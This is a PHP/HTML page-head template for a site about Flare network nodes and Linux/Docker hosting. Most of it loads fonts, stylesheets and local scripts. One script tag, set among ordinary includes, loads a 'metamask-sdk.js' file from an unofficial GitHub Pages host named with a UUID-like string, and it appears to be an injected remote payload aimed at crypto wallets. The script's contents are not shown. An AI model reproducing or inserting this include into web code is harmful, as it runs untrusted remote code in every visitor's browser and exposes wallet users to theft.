<head>
    <!-- meta character set -->
    <meta charset="utf-8">
    <!-- Always force latest IE rendering engine or request Chrome Frame -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <!-- Mobile Specific Meta -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Meta Description -->
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="<?=$view['description'] ?>">
    <meta name="author" content="<?=$view['author'] ?>">
    <meta name="keywords" content="flare, flare networks, servers, node, unleashing value, linux, docker, asclinux, linux for php, lfphp">
    <link rel="icon" href="<?=$view['favicon'] ?>">

    <link rel="apple-touch-icon" href="<?=$view['urlbaseaddr'] ?>apple-touch-icon.png">

    <title><?=$view['title'] ?></title>

    <!-- CSS
    ================================================== -->

    <link href="<?=$view['urlbaseaddr'] ?>css/fonts-poppins.css" rel="stylesheet" type='text/css'>
    <link href="<?=$view['urlbaseaddr'] ?>css/fonts-opensans.css" rel="stylesheet" type="text/css">

    <!-- Fontawesome Icon font -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/all.min.css">
    <!-- bootstrap.min -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/jquery.fancybox.css">
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/jquery-confirm.min.css">
    <!-- bootstrap.min -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/selectize.default.css">
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/selectize.bootstrap4.css">
    <!-- bootstrap.min -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/bootstrap.min.css">
    <!-- owl.carousel.min -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/owl.carousel.min.css">
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/owl.theme.default.min.css">
    <!-- slit-slider.css -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/slit-slider.css">
    <!-- animate.css -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/animate.css">
    <!-- Main Stylesheet -->
    <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/main.css">

    <?php foreach($view['css'] as $key => $value): ?>
        <link href="<?php echo $value ?>" rel="stylesheet">
    <?php endforeach; ?>

    <?php foreach($view['jshead'] as $key => $value): ?>
        <script src="<?php echo $value ?>"></script>
    <?php endforeach; ?>

    <script>
        // Required by some npm packages
        window.process = { browser: true, env: { ENVIRONMENT: 'BROWSER' } };
    </script>

    <script src="<?=$view['urlbaseaddr'] ?>js/navbar.js"></script>

    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>

    <?php foreach($view['jsscriptshead'] as $key => $value): ?>
        <?php echo $value ?>
    <?php endforeach; ?>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="<?=$view['urlbaseaddr'] ?>js/html5shiv.min.js"></script>
      <script src="<?=$view['urlbaseaddr'] ?>js/respond.min.js"></script>
    <![endif]-->
</head>
